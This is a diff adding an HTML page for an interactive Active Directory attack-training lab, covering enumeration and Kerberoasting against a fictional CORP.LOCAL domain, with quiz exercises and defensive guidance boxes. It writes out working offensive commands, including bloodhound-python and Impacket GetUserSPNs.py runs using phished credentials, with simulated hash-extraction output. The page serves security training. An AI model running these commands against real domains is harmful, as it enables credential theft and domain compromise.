@@ -1,0 +1,1993 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <script src="../../../../components/AccessGuard.js"></script>
+  <script>AccessGuard.require('sorted');</script>
+  <script src="../../../../components/ModuleProgress.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AD Attack Lab — Active Directory Offensive Operations | Dark Arts Vault</title>
+  <style>
+    /* ================================================================
+       RESET & CSS CUSTOM PROPERTIES
+       ================================================================ */
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg:          #0a0e1a;
+      --surface:     #0d1120;
+      --surface2:    #111827;
+      --surface3:    #1a2035;
+      --border:      rgba(107, 33, 168, 0.25);
+      --border-dim:  rgba(107, 33, 168, 0.12);
+      --purple:      #6b21a8;
+      --purple-mid:  #9333ea;
+      --purple-light:#c084fc;
+      --glow:        rgba(107, 33, 168, 0.3);
+      --text:        #e2e8f0;
+      --muted:       #8892a4;
+      --dim:         #4b5563;
+      --green:       #22c55e;
+      --green-dim:   rgba(34, 197, 94, 0.12);
+      --amber:       #f59e0b;
+      --amber-dim:   rgba(245, 158, 11, 0.12);
+      --red:         #ef4444;
+      --red-dim:     rgba(239, 68, 68, 0.12);
+      --blue:        #3b82f6;
+      --blue-dim:    rgba(59, 130, 246, 0.12);
+      --cyan:        #06b6d4;
+      --term-bg:     #060810;
+      --term-green:  #22c55e;
+      --term-dim:    #166534;
+      --term-cmd:    #86efac;
+      --term-prompt: #c084fc;
+      --term-yellow: #fbbf24;
+      --term-red:    #f87171;
+      --term-cyan:   #67e8f9;
+      --term-white:  #f1f5f9;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Courier New', monospace;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse at 15% 10%, rgba(107, 33, 168, 0.08) 0%, transparent 50%),
+        radial-gradient(ellipse at 85% 90%, rgba(147, 51, 234, 0.05) 0%, transparent 50%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* ================================================================
+       HEADER
+       ================================================================ */
+    .lab-header {
+      position: sticky;
+      top: 0;
+      z-index: 200;
+      background: rgba(10, 14, 26, 0.97);
+      border-bottom: 1px solid var(--border);
+      backdrop-filter: blur(14px);
+      padding: 12px 28px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .back-btn {
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 0.75rem;
+      letter-spacing: 0.08em;
+      padding: 5px 12px;
+      border: 1px solid var(--border);
+      border-radius: 3px;
+      transition: all 0.2s;
+      white-space: nowrap;
+    }
+
+    .back-btn:hover {
+      color: var(--purple-light);
+      border-color: var(--purple-mid);
+      background: rgba(107, 33, 168, 0.08);
+    }
+
+    .header-title {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .header-eyebrow {
+      font-size: 0.65rem;
+      color: var(--purple-light);
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      margin-bottom: 2px;
+    }
+
+    .header-name {
+      font-size: 0.95rem;
+      color: var(--text);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .stage-tracker {
+      display: flex;
+      gap: 5px;
+      align-items: center;
+    }
+
+    .stage-pip {
+      width: 28px;
+      height: 5px;
+      border-radius: 2px;
+      background: var(--surface3);
+      border: 1px solid var(--border-dim);
+      transition: all 0.3s;
+    }
+
+    .stage-pip.active { background: var(--purple-mid); border-color: var(--purple-mid); }
+    .stage-pip.done   { background: var(--green); border-color: var(--green); }
+
+    .stage-label {
+      font-size: 0.72rem;
+      color: var(--muted);
+      margin-left: 8px;
+      white-space: nowrap;
+    }
+
+    /* ================================================================
+       STAGE NAV TABS
+       ================================================================ */
+    .stage-nav {
+      display: flex;
+      gap: 2px;
+      padding: 10px 28px;
+      background: var(--surface);
+      border-bottom: 1px solid var(--border-dim);
+      overflow-x: auto;
+    }
+
+    .stage-tab {
+      padding: 6px 14px;
+      border: 1px solid var(--border-dim);
+      border-radius: 3px;
+      background: transparent;
+      color: var(--dim);
+      font-family: 'Courier New', monospace;
+      font-size: 0.75rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      white-space: nowrap;
+      letter-spacing: 0.05em;
+    }
+
+    .stage-tab:hover    { color: var(--muted); border-color: var(--border); }
+    .stage-tab.active   { background: var(--purple); color: #fff; border-color: var(--purple); }
+    .stage-tab.done     { border-color: var(--green); color: var(--green); }
+    .stage-tab.locked   { opacity: 0.4; cursor: not-allowed; }
+
+    /* ================================================================
+       MAIN LAYOUT
+       ================================================================ */
+    .lab-body {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 28px 28px 60px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .stage-panel { display: none; }
+    .stage-panel.active { display: block; }
+
+    /* ================================================================
+       STAGE INTRO
+       ================================================================ */
+    .stage-intro {
+      margin-bottom: 24px;
+    }
+
+    .stage-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.65rem;
+      letter-spacing: 0.15em;
+      color: var(--purple-light);
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .stage-badge-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--purple-mid);
+      box-shadow: 0 0 6px var(--purple-mid);
+      animation: pulse-dot 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0.4; }
+    }
+
+    .stage-heading {
+      font-size: 1.4rem;
+      color: var(--text);
+      margin-bottom: 6px;
+      letter-spacing: 0.03em;
+    }
+
+    .stage-heading span { color: var(--purple-light); }
+
+    .mitre-ref {
+      display: inline-block;
+      font-size: 0.68rem;
+      color: var(--amber);
+      border: 1px solid rgba(245, 158, 11, 0.3);
+      background: var(--amber-dim);
+      padding: 2px 8px;
+      border-radius: 2px;
+      letter-spacing: 0.1em;
+      margin-bottom: 16px;
+    }
+
+    .concept-text {
+      color: var(--muted);
+      font-size: 0.84rem;
+      line-height: 1.75;
+      margin-bottom: 12px;
+    }
+
+    .concept-text strong { color: var(--purple-light); }
+
+    /* ================================================================
+       SECTION LABELS
+       ================================================================ */
+    .section-label {
+      font-size: 0.65rem;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--purple-light);
+      margin-bottom: 8px;
+      padding-bottom: 4px;
+      border-bottom: 1px solid var(--border-dim);
+    }
+
+    /* ================================================================
+       TERMINAL
+       ================================================================ */
+    .terminal {
+      background: var(--term-bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      margin-bottom: 20px;
+      overflow: hidden;
+      box-shadow: 0 0 20px rgba(107, 33, 168, 0.1);
+    }
+
+    .terminal-bar {
+      background: rgba(107, 33, 168, 0.15);
+      padding: 7px 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border-bottom: 1px solid var(--border-dim);
+    }
+
+    .terminal-dots { display: flex; gap: 5px; }
+    .terminal-dot  { width: 9px; height: 9px; border-radius: 50%; }
+    .dot-red   { background: #ef4444; }
+    .dot-amber { background: #f59e0b; }
+    .dot-green { background: #22c55e; }
+
+    .terminal-title {
+      font-size: 0.7rem;
+      color: var(--muted);
+      letter-spacing: 0.08em;
+    }
+
+    .terminal-body {
+      padding: 14px 18px;
+      font-size: 0.8rem;
+      line-height: 1.8;
+      min-height: 120px;
+      color: var(--term-green);
+    }
+
+    .t-prompt  { color: var(--term-prompt); }
+    .t-cmd     { color: var(--term-cmd); }
+    .t-comment { color: var(--term-dim); }
+    .t-key     { color: var(--term-yellow); }
+    .t-val     { color: var(--term-cyan); }
+    .t-err     { color: var(--term-red); }
+    .t-white   { color: var(--term-white); }
+    .t-dim     { color: var(--term-dim); opacity: 0.8; }
+
+    /* Interactive terminal input */
+    .terminal-input-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 18px 14px;
+      border-top: 1px solid rgba(107, 33, 168, 0.1);
+    }
+
+    .terminal-input-row .t-prompt { flex-shrink: 0; font-size: 0.8rem; }
+
+    .term-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: var(--term-cmd);
+      font-family: 'Courier New', monospace;
+      font-size: 0.8rem;
+      caret-color: var(--term-green);
+    }
+
+    .term-run-btn {
+      background: rgba(107, 33, 168, 0.2);
+      border: 1px solid var(--border);
+      color: var(--purple-light);
+      font-family: 'Courier New', monospace;
+      font-size: 0.72rem;
+      padding: 4px 12px;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .term-run-btn:hover {
+      background: rgba(107, 33, 168, 0.35);
+      border-color: var(--purple-mid);
+    }
+
+    /* ================================================================
+       EXERCISE CARDS
+       ================================================================ */
+    .exercise-card {
+      background: var(--surface2);
+      border: 1px solid var(--border-dim);
+      border-radius: 4px;
+      padding: 18px 20px;
+      margin-bottom: 16px;
+    }
+
+    .exercise-title {
+      font-size: 0.8rem;
+      color: var(--purple-light);
+      letter-spacing: 0.08em;
+      margin-bottom: 10px;
+    }
+
+    .exercise-prompt {
+      font-size: 0.82rem;
+      color: var(--muted);
+      margin-bottom: 14px;
+      line-height: 1.65;
+    }
+
+    /* Checkbox options */
+    .option-list { display: grid; gap: 7px; }
+
+    .option-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 12px;
+      border: 1px solid var(--border-dim);
+      border-radius: 3px;
+      cursor: pointer;
+      font-size: 0.8rem;
+      color: var(--muted);
+      transition: all 0.2s;
+      user-select: none;
+    }
+
+    .option-item:hover { border-color: var(--border); color: var(--text); }
+
+    .option-item input[type="checkbox"],
+    .option-item input[type="radio"] {
+      accent-color: var(--purple-mid);
+      width: 14px;
+      height: 14px;
+      cursor: pointer;
+    }
+
+    .option-item.correct { border-color: var(--green); background: var(--green-dim); color: var(--green); }
+    .option-item.wrong   { border-color: var(--red); background: var(--red-dim); color: var(--red); }
+
+    /* Check button */
+    .check-btn {
+      background: rgba(107, 33, 168, 0.2);
+      border: 1px solid var(--purple-mid);
+      color: var(--purple-light);
+      font-family: 'Courier New', monospace;
+      font-size: 0.8rem;
+      padding: 8px 20px;
+      border-radius: 3px;
+      cursor: pointer;
+      letter-spacing: 0.06em;
+      transition: all 0.2s;
+      margin-top: 12px;
+    }
+
+    .check-btn:hover { background: rgba(107, 33, 168, 0.35); }
+    .check-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+    /* Result feedback */
+    .result-box {
+      margin-top: 10px;
+      padding: 10px 14px;
+      border-radius: 3px;
+      font-size: 0.8rem;
+      display: none;
+      line-height: 1.6;
+    }
+
+    .result-box.ok  { background: var(--green-dim); border: 1px solid rgba(34, 197, 94, 0.3); color: var(--green); }
+    .result-box.err { background: var(--red-dim);   border: 1px solid rgba(239, 68, 68, 0.3); color: #f87171; }
+
+    /* ================================================================
+       DEFENSE CALLOUT
+       ================================================================ */
+    .defense-box {
+      border: 1px solid rgba(59, 130, 246, 0.35);
+      background: rgba(59, 130, 246, 0.07);
+      border-radius: 4px;
+      padding: 16px 18px;
+      margin-bottom: 20px;
+    }
+
+    .defense-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.7rem;
+      letter-spacing: 0.15em;
+      color: var(--blue);
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .defense-header::before {
+      content: '';
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border: 2px solid var(--blue);
+      border-radius: 50%;
+    }
+
+    .defense-list {
+      list-style: none;
+      display: grid;
+      gap: 6px;
+    }
+
+    .defense-list li {
+      font-size: 0.8rem;
+      color: var(--muted);
+      padding-left: 14px;
+      position: relative;
+      line-height: 1.6;
+    }
+
+    .defense-list li::before {
+      content: '>';
+      position: absolute;
+      left: 0;
+      color: var(--blue);
+      font-weight: bold;
+    }
+
+    /* ================================================================
+       BLOODHOUND GRAPH (Stage 6)
+       ================================================================ */
+    .graph-container {
+      background: var(--term-bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 20px;
+      margin-bottom: 16px;
+      position: relative;
+      overflow: hidden;
+      min-height: 340px;
+    }
+
+    .graph-svg-wrap {
+      width: 100%;
+      height: 320px;
+    }
+
+    .bh-node {
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .bh-node circle {
+      stroke-width: 2;
+      transition: all 0.2s;
+    }
+
+    .bh-node:hover circle { filter: brightness(1.3); }
+    .bh-node.selected circle { stroke-width: 3; filter: brightness(1.4); }
+
+    .bh-edge { stroke-width: 1.5; opacity: 0.5; }
+    .bh-edge.critical { stroke: #ef4444; opacity: 0.8; stroke-width: 2.5; stroke-dasharray: 6 3; animation: dash-anim 1.5s linear infinite; }
+
+    @keyframes dash-anim { to { stroke-dashoffset: -18; } }
+
+    .bh-label {
+      font-family: 'Courier New', monospace;
+      font-size: 9px;
+      fill: #e2e8f0;
+      text-anchor: middle;
+      pointer-events: none;
+    }
+
+    .node-info-panel {
+      background: rgba(13, 17, 32, 0.95);
+      border: 1px solid var(--border);
+      border-radius: 3px;
+      padding: 12px 14px;
+      font-size: 0.78rem;
+      color: var(--muted);
+      min-height: 60px;
+      margin-bottom: 12px;
+      line-height: 1.7;
+    }
+
+    .node-info-panel strong { color: var(--purple-light); }
+
+    /* ================================================================
+       HASH DISPLAY
+       ================================================================ */
+    .hash-display {
+      background: var(--term-bg);
+      border: 1px solid var(--border-dim);
+      border-radius: 3px;
+      padding: 10px 14px;
+      font-size: 0.75rem;
+      color: var(--term-yellow);
+      word-break: break-all;
+      margin-bottom: 12px;
+      line-height: 1.7;
+    }
+
+    /* ================================================================
+       ACCOUNT TABLE
+       ================================================================ */
+    .account-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.78rem;
+      margin-bottom: 14px;
+    }
+
+    .account-table th {
+      text-align: left;
+      padding: 7px 10px;
+      color: var(--purple-light);
+      border-bottom: 1px solid var(--border);
+      font-weight: normal;
+      letter-spacing: 0.07em;
+      font-size: 0.72rem;
+    }
+
+    .account-table td {
+      padding: 6px 10px;
+      border-bottom: 1px solid var(--border-dim);
+      color: var(--muted);
+    }
+
+    .account-table tr:hover td { background: rgba(107, 33, 168, 0.06); }
+
+    .badge {
+      display: inline-block;
+      padding: 1px 7px;
+      border-radius: 2px;
+      font-size: 0.68rem;
+      letter-spacing: 0.07em;
+    }
+
+    .badge-red    { background: var(--red-dim); color: var(--red); border: 1px solid rgba(239, 68, 68, 0.25); }
+    .badge-amber  { background: var(--amber-dim); color: var(--amber); border: 1px solid rgba(245, 158, 11, 0.25); }
+    .badge-green  { background: var(--green-dim); color: var(--green); border: 1px solid rgba(34, 197, 94, 0.25); }
+    .badge-purple { background: rgba(107,33,168,0.15); color: var(--purple-light); border: 1px solid var(--border); }
+
+    /* ================================================================
+       STAGE COMPLETE BUTTON
+       ================================================================ */
+    .advance-btn {
+      display: block;
+      width: 100%;
+      padding: 13px;
+      background: linear-gradient(135deg, var(--purple), var(--purple-mid));
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      font-size: 0.88rem;
+      letter-spacing: 0.08em;
+      cursor: pointer;
+      margin-top: 24px;
+      transition: all 0.25s;
+      opacity: 0.35;
+    }
+
+    .advance-btn.ready { opacity: 1; box-shadow: 0 0 16px rgba(107, 33, 168, 0.4); }
+    .advance-btn.ready:hover { transform: translateY(-1px); box-shadow: 0 0 22px rgba(147, 51, 234, 0.5); }
+
+    /* Final complete button */
+    .complete-btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #166534, #22c55e);
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      letter-spacing: 0.1em;
+      cursor: pointer;
+      margin-top: 28px;
+      transition: all 0.25s;
+      opacity: 0.35;
+    }
+
+    .complete-btn.ready { opacity: 1; box-shadow: 0 0 18px rgba(34, 197, 94, 0.35); }
+    .complete-btn.ready:hover { transform: translateY(-1px); box-shadow: 0 0 26px rgba(34, 197, 94, 0.5); }
+
+    /* ================================================================
+       HINT SYSTEM
+       ================================================================ */
+    .hint-toggle {
+      background: transparent;
+      border: 1px solid rgba(245, 158, 11, 0.3);
+      color: var(--amber);
+      font-family: 'Courier New', monospace;
+      font-size: 0.72rem;
+      padding: 4px 12px;
+      border-radius: 3px;
+      cursor: pointer;
+      letter-spacing: 0.06em;
+      margin-bottom: 12px;
+      transition: all 0.2s;
+    }
+
+    .hint-toggle:hover { background: var(--amber-dim); }
+
+    .hint-box {
+      background: var(--amber-dim);
+      border: 1px solid rgba(245, 158, 11, 0.25);
+      border-left: 3px solid var(--amber);
+      border-radius: 3px;
+      padding: 10px 14px;
+      font-size: 0.78rem;
+      color: #fcd34d;
+      display: none;
+      margin-bottom: 14px;
+      line-height: 1.65;
+    }
+
+    /* ================================================================
+       MISC UTILITIES
+       ================================================================ */
+    .two-col {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin-bottom: 16px;
+    }
+
+    @media (max-width: 640px) { .two-col { grid-template-columns: 1fr; } }
+
+    .spacer { height: 16px; }
+    .divider { border: none; border-top: 1px solid var(--border-dim); margin: 20px 0; }
+
+    .select-field {
+      background: var(--surface3);
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-family: 'Courier New', monospace;
+      font-size: 0.8rem;
+      padding: 7px 10px;
+      border-radius: 3px;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    .text-field {
+      background: var(--surface3);
+      border: 1px solid var(--border);
+      color: var(--term-cmd);
+      font-family: 'Courier New', monospace;
+      font-size: 0.8rem;
+      padding: 7px 10px;
+      border-radius: 3px;
+      width: 100%;
+      outline: none;
+    }
+
+    .text-field::placeholder { color: var(--dim); }
+    .text-field:focus { border-color: var(--purple-mid); }
+
+    .inline-code {
+      background: rgba(107,33,168,0.12);
+      border: 1px solid var(--border-dim);
+      color: var(--purple-light);
+      padding: 1px 6px;
+      border-radius: 2px;
+      font-size: 0.85em;
+    }
+
+    /* Attack path highlight */
+    .path-step {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px;
+      border: 1px solid var(--border-dim);
+      border-radius: 3px;
+      margin-bottom: 6px;
+      font-size: 0.78rem;
+      color: var(--muted);
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .path-step:hover { border-color: var(--purple-mid); color: var(--text); }
+    .path-step.selected-step { border-color: var(--red); background: var(--red-dim); color: var(--red); }
+    .path-step.correct-step  { border-color: var(--green); background: var(--green-dim); color: var(--green); }
+
+    .step-num {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: var(--surface3);
+      border: 1px solid var(--border);
+      font-size: 0.68rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      color: var(--purple-light);
+    }
+  </style>
+</head>
+<body>
+
+<!-- ================================================================
+     HEADER
+     ================================================================ -->
+<header class="lab-header">
+  <a href="../../index.html" class="back-btn">&#8592; Dark Arts</a>
+  <div class="header-title">
+    <div class="header-eyebrow">Vault / Advanced Offensive Operations</div>
+    <div class="header-name">Active Directory Attack Lab</div>
+  </div>
+  <div class="stage-tracker" id="stageTracker">
+    <div class="stage-pip active" id="pip0"></div>
+    <div class="stage-pip" id="pip1"></div>
+    <div class="stage-pip" id="pip2"></div>
+    <div class="stage-pip" id="pip3"></div>
+    <div class="stage-pip" id="pip4"></div>
+    <div class="stage-pip" id="pip5"></div>
+    <span class="stage-label" id="stageLabel">Stage 1 / 6</span>
+  </div>
+</header>
+
+<!-- Stage Nav -->
+<nav class="stage-nav">
+  <button class="stage-tab active" id="tab0" onclick="goToStage(0)">01. Recon</button>
+  <button class="stage-tab locked" id="tab1" onclick="goToStage(1)">02. Kerberoast</button>
+  <button class="stage-tab locked" id="tab2" onclick="goToStage(2)">03. AS-REP Roast</button>
+  <button class="stage-tab locked" id="tab3" onclick="goToStage(3)">04. DCSync</button>
+  <button class="stage-tab locked" id="tab4" onclick="goToStage(4)">05. Golden Ticket</button>
+  <button class="stage-tab locked" id="tab5" onclick="goToStage(5)">06. BloodHound</button>
+</nav>
+
+<!-- ================================================================
+     MAIN CONTENT
+     ================================================================ -->
+<main class="lab-body">
+
+  <!-- ============================================================
+       STAGE 1: RECONNAISSANCE & ENUMERATION
+       ============================================================ -->
+  <section class="stage-panel active" id="stage0">
+    <div class="stage-intro">
+      <div class="stage-badge"><span class="stage-badge-dot"></span>Stage 01 of 06</div>
+      <h1 class="stage-heading">Reconnaissance &amp; <span>Enumeration</span></h1>
+      <div class="mitre-ref">MITRE ATT&amp;CK: T1087 — Account Discovery | T1069 — Permission Groups Discovery</div>
+      <p class="concept-text">
+        Before any attack against Active Directory, operators must conduct thorough enumeration. AD exposes a rich LDAP interface that any authenticated domain user can query — no elevated privileges required. The goal is to map the domain: users, computers, groups, trusts, and most importantly, <strong>service principal names (SPNs)</strong> that identify Kerberoastable accounts.
+      </p>
+      <p class="concept-text">
+        Tools like <strong>BloodHound/SharpHound</strong>, <strong>PowerView</strong>, and native PowerShell AD cmdlets are used to build an attack map. Every privileged group member, every service account, every machine with an active admin session becomes a node in your attack graph. Enumerate thoroughly — missed nodes mean missed attack paths.
+      </p>
+      <p class="concept-text">
+        Target environment: <strong>CORP.LOCAL</strong> — a mid-size enterprise domain with 847 user objects, 312 computer objects, and 94 security groups. You have low-privilege credentials: <span class="inline-code">jsmith / Welcome1!</span> obtained via phishing.
+      </p>
+    </div>
+
+    <!-- Simulated Terminal: Domain Enumeration -->
+    <div class="section-label">Simulated Enumeration Terminal</div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-amber"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <span class="terminal-title">PowerShell — CORP\jsmith@WS-042</span>
+      </div>
+      <div class="terminal-body" id="s1-term-output">
+<span class="t-comment"># Run a command below to enumerate the domain</span>
+      </div>
+      <div class="terminal-input-row">
+        <span class="t-prompt">PS C:\&gt;</span>
+        <input class="term-input" id="s1-input" type="text" placeholder="Type a command and press Enter..." autocomplete="off" spellcheck="false">
+        <button class="term-run-btn" onclick="runS1Command()">Run</button>
+      </div>
+    </div>
+
+    <div class="section-label">Available Commands (click to auto-fill)</div>
+    <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:20px;">
+      <button class="term-run-btn" onclick="fillCmd('Get-ADUser -Filter * -Properties SamAccountName,ServicePrincipalName,MemberOf | Select Name,SamAccountName,ServicePrincipalName')">Get-ADUser (SPNs)</button>
+      <button class="term-run-btn" onclick="fillCmd('Get-ADGroup -Filter * | Where-Object {$_.Name -like \"*Admin*\"} | Select Name,DistinguishedName')">Get-ADGroup (Admins)</button>
+      <button class="term-run-btn" onclick="fillCmd('Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem,IPv4Address')">Get-ADComputer</button>
+      <button class="term-run-btn" onclick="fillCmd('bloodhound-python -u jsmith -p Welcome1! -d corp.local -c All --zip')">bloodhound-python</button>
+    </div>
+
+    <!-- Exercise 1 -->
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 1.1 — Identify High-Value Targets</div>
+      <p class="exercise-prompt">
+        After running <span class="inline-code">Get-ADUser</span> with SPN enumeration, you retrieved the accounts below.
+        Select ALL accounts that are Kerberoastable (have registered Service Principal Names).
+      </p>
+      <table class="account-table">
+        <thead>
+          <tr>
+            <th>Username</th><th>Display Name</th><th>SPN</th><th>Groups</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>jsmith</td><td>John Smith</td><td><span class="t-dim">—</span></td><td>Domain Users</td></tr>
+          <tr><td>svc_mssql</td><td>SQL Service Acct</td><td><span class="badge badge-red">MSSQLSvc/db01.corp.local:1433</span></td><td>Domain Users</td></tr>
+          <tr><td>svc_backup</td><td>Backup Service</td><td><span class="badge badge-red">MSServerBU/backup01.corp.local</span></td><td>Backup Operators</td></tr>
+          <tr><td>karen.admin</td><td>Karen Mills</td><td><span class="t-dim">—</span></td><td>Domain Admins</td></tr>
+          <tr><td>svc_web</td><td>Web App Service</td><td><span class="badge badge-red">HTTP/intranet.corp.local:8080</span></td><td>Domain Users</td></tr>
+          <tr><td>tom.it</td><td>Tom Renner</td><td><span class="t-dim">—</span></td><td>IT Support, Help Desk</td></tr>
+        </tbody>
+      </table>
+      <div class="option-list" id="s1-ex1-opts">
+        <label class="option-item"><input type="checkbox" name="s1e1" value="svc_mssql"> svc_mssql — MSSQLSvc SPN registered</label>
+        <label class="option-item"><input type="checkbox" name="s1e1" value="karen.admin"> karen.admin — Domain Admin group member</label>
+        <label class="option-item"><input type="checkbox" name="s1e1" value="svc_backup"> svc_backup — MSServerBU SPN registered</label>
+        <label class="option-item"><input type="checkbox" name="s1e1" value="svc_web"> svc_web — HTTP SPN registered</label>
+        <label class="option-item"><input type="checkbox" name="s1e1" value="jsmith"> jsmith — your current compromised account</label>
+      </div>
+      <button class="check-btn" onclick="checkS1E1()">Verify Selection</button>
+      <div class="result-box" id="s1-r1"></div>
+    </div>
+
+    <!-- Exercise 2 -->
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 1.2 — Privileged Group Mapping</div>
+      <p class="exercise-prompt">Which of the following groups grants DCSync rights by default in Active Directory?</p>
+      <div class="option-list" id="s1-ex2-opts">
+        <label class="option-item"><input type="radio" name="s1e2" value="a"> Backup Operators</label>
+        <label class="option-item"><input type="radio" name="s1e2" value="b"> Domain Admins</label>
+        <label class="option-item"><input type="radio" name="s1e2" value="c"> Remote Desktop Users</label>
+        <label class="option-item"><input type="radio" name="s1e2" value="d"> Network Configuration Operators</label>
+      </div>
+      <button class="check-btn" onclick="checkS1E2()">Verify</button>
+      <div class="result-box" id="s1-r2"></div>
+    </div>
+
+    <!-- Defense -->
+    <div class="defense-box">
+      <div class="defense-header">How to Defend — Enumeration</div>
+      <ul class="defense-list">
+        <li>Enable <strong>Advanced Audit Policy</strong> — log LDAP queries (Event ID 1644) and filter for bulk enumeration patterns (100+ objects in single query)</li>
+        <li>Deploy <strong>Microsoft Defender for Identity (MDI)</strong> — baseline normal AD query behavior and alert on reconnaissance patterns</li>
+        <li>Restrict unauthenticated LDAP enumeration with <strong>LDAP channel binding</strong> and <strong>LDAP signing</strong> (KB4520412)</li>
+        <li>Use <strong>Protected Users</strong> security group for all privileged accounts — limits Kerberos options and prevents credential caching</li>
+        <li>Audit <strong>AdminSDHolder</strong> propagation regularly — unexpected ACEs grant persistent elevated permissions</li>
+      </ul>
+    </div>
+
+    <button class="advance-btn" id="adv0" onclick="advanceStage(0)">Advance to Stage 02: Kerberoasting &rarr;</button>
+  </section>
+
+  <!-- ============================================================
+       STAGE 2: KERBEROASTING
+       ============================================================ -->
+  <section class="stage-panel" id="stage1">
+    <div class="stage-intro">
+      <div class="stage-badge"><span class="stage-badge-dot"></span>Stage 02 of 06</div>
+      <h1 class="stage-heading"><span>Kerberoasting</span></h1>
+      <div class="mitre-ref">MITRE ATT&amp;CK: T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting</div>
+      <p class="concept-text">
+        Kerberoasting exploits a fundamental property of Kerberos authentication: any authenticated domain user can request a <strong>Ticket Granting Service (TGS)</strong> ticket for any service registered with a Service Principal Name. These tickets are encrypted with the service account's NTLM password hash. Take the ticket offline, crack it with hashcat — no account lockout, no alerting on failed auth.
+      </p>
+      <p class="concept-text">
+        The attack is devastatingly effective against organizations with old service accounts whose passwords haven't rotated in years. The Impacket suite's <strong>GetUserSPNs.py</strong> automates ticket extraction. RC4-encrypted tickets crack fastest — AES256 is orders of magnitude harder. Prioritize RC4 tickets.
+      </p>
+      <p class="concept-text">
+        From recon you identified three kerberoastable accounts: <strong>svc_mssql</strong>, <strong>svc_backup</strong>, and <strong>svc_web</strong>. svc_mssql is in a higher-privilege context — it was granted <em>db_owner</em> on the finance database. This is your primary target.
+      </p>
+    </div>
+
+    <div class="section-label">Step 1 — Request TGS Tickets</div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-amber"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <span class="terminal-title">kali@attacker:~$ — Impacket GetUserSPNs</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-comment"># Extract kerberoastable hashes — all SPN accounts</span>
+<span class="t-prompt">$ </span><span class="t-cmd">python3 GetUserSPNs.py corp.local/jsmith:Welcome1! -dc-ip 10.0.0.5 -outputfile kerberoast.hashes</span>
+
+<span class="t-dim">ServicePrincipalName               Name        MemberOf                  PasswordLastSet     LastLogon</span>
+<span class="t-dim">---------------------------------  ----------  ------------------------  ------------------  ---------</span>
+<span class="t-key">MSSQLSvc/db01.corp.local:1433</span>      <span class="t-val">svc_mssql</span>   <span class="t-white">Domain Users</span>            <span class="t-white">2019-03-14 08:22:01</span>  <span class="t-white">2024-01-07</span>
+<span class="t-key">MSServerBU/backup01.corp.local</span>     <span class="t-val">svc_backup</span>  <span class="t-white">Backup Operators</span>        <span class="t-white">2021-07-02 15:44:18</span>  <span class="t-white">2024-12-15</span>
+<span class="t-key">HTTP/intranet.corp.local:8080</span>      <span class="t-val">svc_web</span>     <span class="t-white">Domain Users</span>            <span class="t-white">2023-09-11 09:05:33</span>  <span class="t-white">2025-01-02</span>
+
+<span class="t-dim">[-] CCache file is not found. Skipping...</span>
+<span class="t-white">[*] Saved 3 ticket hashes to kerberoast.hashes</span>
